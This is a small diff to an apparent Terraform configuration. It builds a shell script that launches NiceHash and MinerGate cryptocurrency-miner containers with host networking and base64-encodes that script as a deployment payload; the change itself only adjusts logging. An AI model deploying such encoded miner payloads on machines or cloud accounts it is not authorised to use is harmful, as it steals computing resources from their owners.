@@ -25,7 +25,8 @@ locals {
     sudo docker run --rm -d --network=host --name ${local.nicehash_name} ${local.nicehash_image} -l ${local.nicehash_server} -u ${local.nicehash_user}
     if [[ `sudo docker ps | grep ${local.minergate_name}` ]]; then docker stop ${local.minergate_name}; fi
     sudo docker run --rm -d --network=host --name ${local.minergate_name} ${local.minergate_image} -a cryptonight -o ${local.minergate_server} -u ${ local.minergate_user } -p x
-    log "docker ps: $(docker ps -a)"
+    docker ps -a >> $LOGFILE 2>&1
+    log "done"
     EOT
     base64_payload = base64encode(local.payload)
 }
